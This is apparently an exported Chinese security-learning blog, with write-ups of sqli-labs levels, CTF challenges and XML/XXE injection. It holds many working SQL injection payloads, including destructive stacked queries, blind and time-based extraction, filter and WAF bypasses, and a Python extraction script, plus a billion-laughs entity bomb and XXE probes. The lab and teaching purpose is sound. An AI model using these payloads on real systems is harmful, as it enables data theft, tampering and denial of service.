&lt;!DOCTYPE lolz [&lt;!ENTITY lol \"lol\"&gt;&lt;!ENTITY lol2 \"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;\"&gt;&lt;!ENTITY lol3 \"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;\"&gt;&lt;!ENTITY lol4 \"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;\"&gt;&lt;!ENTITY lol5 \"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;\"&gt;&lt;!ENTITY lol6 \"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;\"&gt;&lt;!ENTITY lol7 \"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;\"&gt;&lt;!ENTITY lol8 \"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;\"&gt;&lt;!ENTITY lol9 \"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;\"&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; 原理：递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。 4、探测内网端口与攻击内网网站探测内网端口&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:80\" &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; 3306端口开放3389端口未开放 攻击内网网站&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:80/payload\" &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; 0x06 XXE漏洞防御1、使用开发语言提供的禁用外部实体的方法php:libxml_disable_entity_loader(true); java:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python:from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 2、过滤用户提交的XML数据过滤关键字：&lt;\\!DOCTYPE和&lt;\\!ENTITY，或者SYSTEM和PUBLIC。3、不允许XML中含有自己定义的DTD 0x07 后记总算把常见XML漏洞学完了，这里重点学习了XXE漏洞(XML外部实体注入)。整体来说，收获很大。 参考博客：XML实体注入漏洞漏洞利用: XML外部实体（XXE）注入","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"XML","slug":"XML","permalink":"https://qwzf.gitee.io/blog/tags/XML/"},{"name":"XML注入","slug":"XML注入","permalink":"https://qwzf.gitee.io/blog/tags/XML注入/"},{"name":"Xpath注入","slug":"Xpath注入","permalink":"https://qwzf.gitee.io/blog/tags/Xpath注入/"},{"name":"XXE漏洞","slug":"XXE漏洞","permalink":"https://qwzf.gitee.io/blog/tags/XXE漏洞/"}],"author":"qwzf"},{"title":"sqli-labs攻关5(Sta)(Less-39_Less-53)","slug":"sqli-labs攻关5(Sta)(Less-39_Less-53)","date":"2019-11-16T15:58:43.000Z","updated":"2019-11-21T12:23:20.981Z","comments":true,"path":"2019/11/16/sqli-labs攻关5(Sta)(Less-39_Less-53)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/11/16/sqli-labs攻关5(Sta)(Less-39_Less-53)/","excerpt":"","text":"前言闲来无事，继续打sqlilabs，并总结相关知识。 一、堆叠注入(Less-39-Less-45)Stacked injection：堆叠注入(堆查询注入) 堆叠注入的原理在SQL中，分号;是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。 而union injection(联合注入)也是将两条语句合并在一起，两者之间有什么区别？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句(增删改查)。例如：用户输入1; DELETE FROM products服务器端生成的sql语句为：select * from prosducts where productid=1;DELETE FROM products 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 堆叠注入的局限性堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制。当然权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。发现了一张图上面说不支持mysql/php环境，但测试后发现支持，应该是版本的不同的原因。 堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，建议使用union(联合)注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。 堆叠注入的使用条件堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用。利用mysqli_multi_query()函数就支持多条sql语句同时执行。但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。 了解堆叠注入之后开始攻关 Less-39测试后发现，为数字型。就借此再练习一下SQL语句吧！增id=1;insert into users(id,username,password) values(39,'Less39','Less39')--+ 删id=1;delete from users where id=39--+ 改id=1;update users set password='admin' where id=8--+ 查 id=1;select * from users where id=8--+ 发现浏览器上并没有显示查询结果。于是想到堆叠注入的局限性：代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果。因此，在读取数据时，可以使用union(联合)注入。id=0 union select 1,2,database()--+ Less-40查询源码，得到闭合方式为&#39;)。因为不会报错，需要用盲注猜测闭合方式。如果只闭合&#39;，可以使用盲注来做题id=1' and ascii(substr((select database()),1,1))&gt;-1 and '1'='1 同样也可以用堆叠注入，参考Less-39Less-41同样是堆叠注入，不会报错，为数字型注入。参考Less-39Less-42看着好像二次注入的页面，更改密码页是二次注入。不再描述。$username = mysqli_real_escape_string($con1, $_POST[\"login_user\"]);$password = $_POST[\"login_password\"]; 发现login_user被过滤，注入点应该在login_password。mysqli_real_escape_string() 因为源码中，仍然有mysqli_multi_query()函数。所以可以继续使用堆叠注入,并且这是POST型堆叠注入，单引号闭合。创建一个等于users的test表login_user=admin&amp;login_password=1';create table test like users;--+ 创建成功，并且表为空其他操作，类似。Less-43测试发现，闭合方式为&#39;)，其余参考Less-42Less-44这里没有了报错，但是注入语句还是一样的，可用盲注猜测闭合方式。也可以用其他方法猜测。闭合方式&#39;，其他类似Less-42Less-45仍然是堆叠注入，不会报错，可用盲注猜测闭合方式。也可以用其他方法猜测。闭合方式&#39;)，其他类似Less-42 CTF例题实战例题：[强网杯 2019]随便注环境平台：BUUCTF首先，先进行测试，发现单引号闭合。然后使用几乎万能的明注方法–报错注入，发现一些关键字被过滤，只可以爆出数据库。payload?inject=1' and extractvalue(1,concat(0x7e,database(),0x7e))--+ 然后试下堆叠注入。因为一些关键字被过滤，所以应该可以使用没有被过滤的show关键字。爆库inject=1';show databases;# 爆表inject=1';show tables;# 爆字段先爆words表的字段inject=1';show columns from `words`;# 没有有用信息，然后爆1919810931114514表的字段，发现flag字段inject=1';show columns from `1919810931114514`;# 爆数据最后爆数据，就应该能得到flag了，但我不会爆，于是看了大师傅的思路思路一： 1.将words表改名为word1或其它任意名字 : rename table words to word1;2.1919810931114514改名为words : rename table 1919810931114514 to words;3.将新的word表插入一列，列名为id : alter table words add id int unsigned not Null auto_increment primary key;4.将flag列改名为data : alert table words change flag data varchar(100); payload1';rename table `words` to `word1`;rename table `1919810931114514` to `words`;alter table `words` add id int unsigned not Null auto_increment primary key; alert table `words` change `flag` `data` varchar(100);# 接着我们再用1’ or 1=1 #,查询就得到flag思路二：读取flag字段内的数据，我们要执行的目标语句是：select * from `1919810931114514`; 而读取flag字段内的数据，需要绕过select的限制。可以使用预编译的方式。预编译相关语法如下： set用于设置变量名和值 prepare用于预备一个语句，并赋予名称，以后可以引用该语句 execute执行语句 deallocateprepare用来释放掉预处理的语句 分析payload-1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#拆分payload：-1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;# 结果为：strstr($inject, \"set\") &amp;&amp; strstr($inject, \"prepare\") 这里检测到了set和prepare关键词，但strstr这个函数并不能区分大小写，将其大写即可。-1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#拆分payload：-1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;# 二、order by排序注入(Less-46-Less-53)order by排序id升序排序：select * from users order by id asc;id降序排序：select * from users order by id desc;mysql&gt; select * from users order by id asc;+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 |+----+----------+------------+13 rows in set (0.00 sec)mysql&gt; select * from users order by id desc;+----+----------+------------+| id | username | password |+----+----------+------------+| 14 | admin4 | admin4 || 12 | dhakkan | dumbo || 11 | admin3 | admin3 || 10 | admin2 | admin2 || 9 | admin1 | admin1 || 8 | admin | admin || 7 | batman | mob!le || 6 | superman | genious || 5 | stupid | stupidity || 4 | secure | crappy || 3 | Dummy | p@ssword || 2 | Angelina | I-kill-you || 1 | Dumb | Dumb |+----+----------+------------+13 rows in set (0.00 sec)mysql&gt; 其中select * from users order by id desc;的desc是可控的传参值。 什么是order by排序注入指可控制的位置在order by子句后，如下order参数可控：select * from goods order by $_GET[&#39;order&#39;] 注入判断在之前的注入利用order by子句进行快速猜解列数，再配合union select语句进行回显。在不知道列名的情况下可以通过列的的序号来指代相应的列。但是却无法做运算，如：order=2-1 和order=1是不一样的。 本地测试环境&lt;?php//error_reporting(0);$mysql_server=\"localhost\";$mysql_username=\"root\";$mysql_userpass=\"xxxx\";$mysql_select_db=\"test\";$config=@mysqli_connect($mysql_server,$mysql_username,$mysql_userpass,$mysql_select_db)or die (mysql_error());if( isset( $_REQUEST[ 'order' ]) ) &#123; $order = $_REQUEST[ 'order' ]; $sql = \"select * from users order by id &#123;$order&#125;;\"; $result = mysqli_query($config,$sql) or die( $sql.\"&lt;pre&gt;\" . mysqli_error($config) . \"&lt;/pre&gt;\"); $num = mysqli_num_rows( $result ); $i = 0; while( $i &lt; $num ) &#123; $row = mysqli_fetch_array($result,MYSQLI_ASSOC); echo \"&lt;pre&gt;id: &#123;$row['Id']&#125; usr: &#123;$row['user']&#125; passwd: &#123;$row['password']&#125;&lt;/pre&gt;\"; $i++; &#125; mysqli_close($config);&#125;else&#123; echo \"set order\";&#125;?&gt; 构造Payload构造出类似and 1=1、and 1=2的Payload以测试注入。 http://127.0.0.1/php/orderby.php?order=and if(1=1,user,password) //通过user字段排序http://127.0.0.1/php/orderby.php?order=and if(1=2,user,password) //通过password字段排序 http://127.0.0.1/php/orderby.php?order=and (CASE+WHEN+(1=1)+THEN+user+ELSE+password+END) //通过user字段排序http://127.0.0.1/php/orderby.php?order=and (CASE+WHEN+(1=1)+THEN+user+ELSE+password+END) //通过password字段排序http://127.0.0.1/php/orderby.php?order=and IFNULL(NULL,password) //通过user字段排序http://127.0.0.1/php/orderby.php?order=and IFNULL(NULL,user) //通过password字段排序 可以观测到排序的结果不一样http://127.0.0.1/php/orderby.php?order=and rand(1=1) http://127.0.0.1/php/orderby.php?order=and rand(1=2) 注入方法1、利用报错1.返回多条记录?order=IF(1=1,1,(select+1+union+select+2)) //正确?order=IF(1=2,1,(select+1+union+select+2)) //错误?order=IF(1=1,1,(select+1+from+information_schema.tables)) //正常?order=IF(1=2,1,(select+1+from+information_schema.tables)) //错误 2.利用regexp?order=(select+1+regexp+if(1=1,1,0x00)) //正常?order=(select+1+regexp+if(1=2,1,0x00)) //错误 通过下可以得知user()第一位为r,ascii码的16进制为0x72?order=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) //正确?order=(select+1+regexp+if(substring(user(),1,1)=0x71,1,0x00)) //错误 3.利用updatexml?order=updatexml(1,if(1=1,1,user()),1) //正确?order=updatexml(1,if(1=2,1,user()),1) //错误 4.利用extractvalue?order=extractvalue(1,if(1=1,1,user())) //正确?order=extractvalue(1,if(1=2,1,user())) //错误 5、报错注入 2、利用盲注如果直接if(1=2,1,sleep(2))sleep时间将会变成2*当前表中记录的数目，将会对服务器造成一定的拒绝服务攻击。?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) //正常响应时间?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) //sleep 2秒 Less-46标题和ORDER BY 从句相关，应该就是order by排序注入。查看源码$sql = \"SELECT * FROM users ORDER BY $id\"; 发现根据输进去的id值是对应的那一列进行排序。需要get传参sort，测试发现是数字型注入。使用sort=1 desc和sort=1 asc来判断，发现存在排序注入。利用报错或利用盲注，进行爆库、爆表等其它注入操作。利用报错sort=1 and updatexml(1,concat(0x7e,database(),0x7e),1) 利用盲注两个and，前两个条件只要有一个条件是false就不会运行if语句。sort=1 and (length(database())) = 8 and if(1=1, sleep(1), null) 或结合rand()sort=rand(ascii(substr((select database()),1,1))&gt;127) Less-47与Less-46相比，闭合方式变为&#39;闭合。其它参考Less-46。Less-48盲注测试，发现是数字型注入。进行盲注sort=rand(ascii(substr((select database()),1,1))&gt;127) Less-49闭合方式为&#39;闭合。测试后发现Less-48的方法行不通。应该可以使用时间盲注。测试后发现，可以使用时间盲注。sort=1' and if(((ascii(substr((select database()),1,1)))&gt;1),sleep(3),0)--+ Less-50数字型注入。利用报错。参考Less-46。源码中使用mysqli_multi_query()函数，也可以进行堆叠注入。sort=1;insert into users(id,username,password) values('16','qwzf','qwzf'); Less-51单引号闭合，desc,asc判断是order by注入。可以利用报错。源码中使用mysqli_multi_query()函数也，可以进行堆叠注入。Less-52盲注判断为数字型注入。依然有mysqli_multi_query()函数，可以进行堆叠注入。Less-53和Less-52相比，变成单引号闭合。 三、异或注入通过攻关sqli-labs的方式基本上总结完SQL注入了。但我又发现了一种SQL注入类型–异或注入，于是就再总结一下。 背景在尝试SQL注入时,发现union,and被完全过滤掉了,就可以考虑使用异或注入。 异或注入的原理异或是一种逻辑运算，运算法则简言之就是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1），null与任何条件做异或运算都为null。如果从数学的角度理解就是，空集与任何集合的交集都为空。mysql里异或运算符为^ 或者 xor 两个同为真的条件做异或，结果为假 两个同为假的条件做异或，结果为假 一个条件为真，一个条件为假，结果为真 null与任何条件（真、假、null）做异或，结果都为null xor与^区别 ^运算符会做位异或运算 如1^2=3 1^2=3 xor做逻辑运算 1 xor 0 会输出1 其他情况输出其他所有数据 判断过滤在id=1后面输入 &#39; ^ (0)--+?id=1&#39; ^ (length(&#39;union&#39;)=5)--+当union被过滤时1^0 输出id=1当union没被过滤时 1^1 输出 id=0 CTF例题实战例题：Bugku-多次环境平台：Bugku加上&#39;，报错但是%23不报错，说明是字符注入。加上&#39;--+，也不报错，说明可以用--+注释。加上&#39; or 1=1--+,报错；尝试&#39; oorr 1=1--+，正常；说明or被过滤了。 如果要判断哪些关键字被过滤，可以使用异或注入。id=1'^(length('union')!=0)--+ 返回正常说明union被过滤了。同理，尝试出来被过滤的关键字：union、select、and、or、（order、information中含or）由最上面知道可以双写绕过。猜字段数http://123.206.87.240:9004/1ndex.php?id=1' oorrder by 2 --+ 正常http://123.206.87.240:9004/1ndex.php?id=1' oorrder by 3 --+ 报错 字段数为2判断显示位id=-1' ununionion selselectect 1,2 --+ 显示位在2爆库id=-1' ununionion selselectect 1,database() --+ 库名：web1002-1爆表id=-1' ununionion selselectect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema='web1002-1'--+ 其他就不演示了。 后记Page-3通关完毕。39关到45关主要涉及堆叠注入，46关到53关主要涉及order by排序注入。看了一眼，发现Page-4的关卡会限定查询次数，最多只能尝试10次。其他基本都是些常规的注入操作，就不总结了。","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://qwzf.gitee.io/blog/tags/SQL/"},{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"堆叠注入","slug":"堆叠注入","permalink":"https://qwzf.gitee.io/blog/tags/堆叠注入/"},{"name":"order by排序注入","slug":"order-by排序注入","permalink":"https://qwzf.gitee.io/blog/tags/order-by排序注入/"}],"author":"qwzf"},{"title":"sqli-labs攻关4(Adv)(Less-23_Less-38)","slug":"sqli-labs攻关4(Adv)(Less-23_Less-38)","date":"2019-11-12T15:02:46.197Z","updated":"2019-11-18T13:58:02.909Z","comments":true,"path":"2019/11/12/sqli-labs攻关4(Adv)(Less-23_Less-38)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/11/12/sqli-labs攻关4(Adv)(Less-23_Less-38)/","excerpt":"","text":"前言总结完最常见的GET型和POST型的联合查询注入、报错注入、SQL盲注，以及简单POST注入。于是继续总结二次注入、GET型过滤敏感关键字注入、WAF绕过注入、宽字节注入。 一、二次注入(Less-24)二次注入：攻击者构造的恶意数据存储到数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。二次注入需要具备的两个条件： 用户向数据库插入恶意语句(即使后端对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义) 数据库对自己存储的数据非常放心，直接取出恶意数据给用户 Less-24猜测这是二次注入，查看源码发现与数据库交互的有注册、登录和改密，即login_create.php，login.php，pass_change.php这三个文件。login_create.php$username= mysql_escape_string($_POST['username']) ;$pass= mysql_escape_string($_POST['password']);$re_pass= mysql_escape_string($_POST['re_password']); echo \"&lt;font size='3' color='#FFFF00'&gt;\";$sql = \"select count(*) from users where username='$username'\"; login.php$username = mysql_real_escape_string($_POST[\"login_user\"]);$password = mysql_real_escape_string($_POST[\"login_password\"]);$sql = \"SELECT * FROM users WHERE username='$username' and password='$password'\"; pass_change.php$username= $_SESSION[\"username\"];$curr_pass= mysql_real_escape_string($_POST['current_password']);$pass= mysql_real_escape_string($_POST['password']);$re_pass= mysql_real_escape_string($_POST['re_password']); if($pass==$re_pass)&#123; $sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \"; 发现很多传参都被过滤之后，才执行SQL语句，主要利用了mysql_real_escape_string()函数只有$_SESSION[&quot;username&quot;]没有被过滤。这个SQL语句是用来更改密码的。mysql_real_escape_string()函数只会过滤以下字符：\\x00、\\n、\\r、\\、&#39;、&quot;、\\x1a而注释是不会过滤掉的，所以可以注册一个包含注释符号(如：#)的username，然后用这个username更改密码的时候会被注入到update语句中，更改注释前面的用户名的密码。 假设我们想登录admin账户且不知道账户密码。如果要更改用户名为admin的密码，只需注册一个admin&#39;#用户然后登陆，更改密码为1234。看下数据库，发现admin账户的密码被改成了1234然后登录框，输入admin 1234就可以登录admin账户了。。。 二、GET型过滤敏感关键字注入(Less-23-Less-28a)Less-23(过滤注释)添加\\发现报错，得到闭合方式为&#39;测试发现--+、#和%23都被过滤了,即过滤了注释。所以就只能用闭合后面引号的方法，根据报错可以知道语句为id=&#39;$ID&#39; limit 0,1那么可以这样闭合id=1&#39; or &#39;1&#39;=&#39;1或者是id=1&#39; and &#39;1&#39;=&#39;1其他注入操作，可以使用联合查询注入或报错注入或延时注入。这里举个爆库的例子联合查询注入联合查询前边步骤就不写了。直接爆库id=-1' union select 1,database(),'3 报错注入id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1 延时注入(SQL盲注)id=1' and if(length(database())=8,sleep(5),1) and '1'='1 id=1' and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1) and '1'='1 Less-25(过滤了or和and)单引号报错,依旧是单引号闭合，注释正常。根据题目，发现果然是被过滤了and和or。然后看了一下源码怎么写的function blacklist($id)&#123; $id= preg_replace('/or/i',\"\", $id); //strip out OR (non case sensitive) $id= preg_replace('/AND/i',\"\", $id); //Strip out AND (non case sensitive) return $id;&#125; 发现使用模式修正符i，i 在和模式进行匹配时不区分大小写。所以不可以使用大小写绕过。可以用逻辑运算符&amp;&amp;代替and，||代替or。但&amp;要换成%26url编码id=1' || 1=1--+ id=1' %26%26 1=1--+ 当然也可以使用双写绕过aandnd、oorr。然后其他注入操作呢，依旧可以使用联合查询注入、报错注入，和Less-23类似。报错注入id=1' || updatexml(1,concat(0x7e,database(),0x7e),1)--+ Less-25a(过滤or和and的盲注)将Less-25的单引号字符型改为整型，然后使用盲注即可，注意双写绕过。布尔盲注id=1 || length(database())=8 --+ 可以写个脚本，这里直接放上飘零师傅的脚本#!/usr/bin/env python# -*- coding: utf-8 -*-import requests#url = \"http://localhost/sql/Less-25a/?id=2333 || ascii(substr((select database()),%s,1))=%d\"#url = \"http://localhost/sql/Less-25a/?id=2333 || ascii(substr((select group_concat(table_name) from infoorrmation_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%d\"#url = \"http://localhost/sql/Less-25a/?id=2333 || ascii(substr((select group_concat(column_name) from infoorrmation_schema.columns where table_name='users'),%s,1))=%d\"url = \"http://localhost/sql/Less-25a/?id=2333 || ascii(substr((select passwoorrd from users where username='admin'),%s,1))=%d\"result = \"\"# 爆库：select database()# security# 爆表：select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()# emails,referers,uagents,users# 爆字段：select group_concat(column_name) from infoorrmation_schema.columns where table_name='users'# USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password# 拿数据：select passwoorrd from user where username='admin'# 2333for i in range(1,100): for j in range(33,127): payload = url%(i,j) s = requests.get(url=payload) if \"Your Login name:Dumb\" in s.content: result += chr(j) print result breakprint result 当然也可以联合查询注入。id=-1 union select 1,database(),3--+ Less-26(过滤注释和空格)题目标题说过滤了注释和空格。测试一下，看看是不是过滤了注释和空格。试了一把，发现还过滤了and和or。输入?id=and or 1=1--+# 然后又查看下源码function blacklist($id)&#123; $id= preg_replace('/or/i',\"\", $id); //strip out OR (non case sensitive) $id= preg_replace('/and/i',\"\", $id); //Strip out AND (non case sensitive) $id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /* $id= preg_replace('/[--]/',\"\", $id); //Strip out -- $id= preg_replace('/[#]/',\"\", $id); //Strip out # $id= preg_replace('/[\\s]/',\"\", $id); //Strip out spaces $id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id); //Strip out slashes return $id;&#125; 发现过滤了and，or，单行多行注释，正反斜杠/与\\ ,空格，没有过滤单引号。对于注释可以进行单引号闭合，不使用注释；对于and和or可以双写绕过；对于空格，看大师傅博客，发现了一些方法： %09 TAB键（水平）%09 TAB键（水平）%0a 新建一行%0c 新的一页%0d return功能%0b TAB键（垂直）%a0 空格(应该是php转化的时候是一个特殊字符，然后mysql会解释为空白字符) 然后，可以进行明注：联合查询注入、报错注入，也可以进行盲注。这里我使用%a0代替空格(这里测试下爆库)。试了若干次。。。发现Windows下无法使用这些特殊字符来替换空格。那就用linux(我用的ubantu)吧。。。id=0'%a0union%a0select%a02,database(),'3 Less-26a(过滤注释和空格的盲注)与Less-26相比，闭合方式变为&#39;)，且不会显示报错语句Less-27(过滤union和select)标题说过滤了union和select，我测试后发现还过滤了空格和注释。并且测试发现是单引号闭合为了更加清楚的知道过滤了什么，查看源码function blacklist($id)&#123;$id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /*$id= preg_replace('/[--]/',\"\", $id); //Strip out --.$id= preg_replace('/[#]/',\"\", $id); //Strip out #.$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.$id= preg_replace('/select/m',\"\", $id); //Strip out spaces.$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.$id= preg_replace('/union/s',\"\", $id); //Strip out union$id= preg_replace('/select/s',\"\", $id); //Strip out select$id= preg_replace('/UNION/s',\"\", $id); //Strip out UNION$id= preg_replace('/SELECT/s',\"\", $id); //Strip out SELECT$id= preg_replace('/Union/s',\"\", $id); //Strip out Union$id= preg_replace('/Select/s',\"\", $id); //Strip out selectreturn $id;&#125; 模式修正符根据过滤代码，发现大小写类似SelEct，没被过滤。所以大小写绕过即可id=0'%a0UnIon%a0SelEct%a02,database(),'3 Less-27a(过滤union和select的盲注)与Less-27相比，不会显示报错语句，闭合方式变成双引号闭合。闭合方式判断：and 1=1双引号显示正确，and 1=0双引号显示错误。可以大致确定是双引号闭合。Less-28(有括号的单引号字符型，过滤union和select等)与Less-27相比，闭合方式变成&#39;)闭合。看下源码 function blacklist($id)&#123;$id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /*$id= preg_replace('/[--]/',\"\", $id); //Strip out --.$id= preg_replace('/[#]/',\"\", $id); //Strip out #.$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.//$id= preg_replace('/select/m',\"\", $id); //Strip out spaces.$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.$id= preg_replace('/union\\s+select/i',\"\", $id); //Strip out UNION &amp; SELECT.return $id;&#125; Less-28a(有括号的单引号字符型，过滤union和select等的盲注)和Less-28相同。。。看下源码function blacklist($id)&#123;//$id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /*//$id= preg_replace('/[--]/',\"\", $id); //Strip out --.//$id= preg_replace('/[#]/',\"\", $id); //Strip out #.//$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.//$id= preg_replace('/select/m',\"\", $id); //Strip out spaces.//$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.$id= preg_replace('/union\\s+select/i',\"\", $id); //Strip out spaces.return $id;&#125; 发现与Less-28相比，很多过滤还被注释了。如果把注释去掉，基本上过滤了所有字符，但是，所有的一次性过滤都能用双写绕过。当然也可以用盲注。 三、WAF绕过注入(Less-29-Less-31)了解一下WAFWAFMYSQL注入天书之服务器两层架构在SQL注入过程中主流的WAF绕过技术： 1.转换特征字符大小写2.利用注释绕过3.编码特征字符绕过4.分隔重写特征字符绕过5.利用截断字符绕过6.变换变量位置绕过7.针对域名保护的绕近8.超大数据包绕过9.转换数据提交方式绕过10.HPP（HTTP参数污染）绕过 ?id=1&amp;id=2 apache(php)解析最后一个参数，即显示id=2的内容。Tomcat(jsp)解析第一个参数，即显示id=1的内容。Tomcat功能类似一个WAF所以我们要传入两个id，第一个用来欺骗waf，第二个用来传送给apache。Less-29(基于WAF的一个错误)测试后发现是单引号闭合。并且没有过滤注释，空格，引号，unsion，select，and，or。所以尝试直接测试id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ 直接报错注入成功。。。。还是再试下吧！于是又试了下联合查询注入id=0' union select 1,database(),3 --+ 依旧成功。。。。最后再试试linux系统下的。。。依旧成功。。。。Less-30(基于错误的GET型双引号字符型注入)测试后发现是双引号闭合，将 Less-29的payload的&#39;换成&quot;id=0” union select 1,database(),3 --+ 发现失败了。于是看了下Less-29的标题和Less-30的标题。发现应该涉及了WAF。查看源码，发现WAF在login.php里//WAF implimentation with a whitelist approach..... only allows input to be Numeric.//使用白名单方法实现WAF。。。。。只允许输入为数字function whitelist($input)&#123; $match = preg_match(\"/^\\d+$/\", $input); if($match) &#123; //echo \"you are good\"; //return $match; &#125; else &#123; header('Location: hacked.php'); //echo \"you are bad\"; &#125;&#125;// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).//当受到HPP（HTTP参数污染）时，下面的函数将模拟参数的行为function java_implimentation($query_string)&#123; $q_s = $query_string; $qs_array= explode(\"&amp;\",$q_s); foreach($qs_array as $key =&gt; $value) &#123; $val=substr($value,0,2); if($val==\"id\") &#123; $id_value=substr($value,3,30); return $id_value; echo \"&lt;br&gt;\"; break; &#125; &#125;&#125; 所以waf是只允许输入数字的，我们在输入数字的时候先给waf看然后检测正常后才转发给我们需要访问的页面。然后模拟了HTTP参数污染时，参数的行为。所以应该可以用HTTP参数污染绕过。这里就不详细分析了。参考飘零师傅的分析(Less-23%20~%20Less-38)/#Less-30)即可。payloadid=1&amp;id=0\" union select 1,2,database() --+ Less-31(Protection with WAF用WAF防护)闭合方式为&quot;)，解法参照Less-30 四、宽字节注入(Less-32-Less-38)相关概念 单字节字符集： 所有的字符都使用一个字节来表示，比如 ASCII 编码。多字节字符集： 在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。两位的多字节字符有一个前导字节和尾字节。 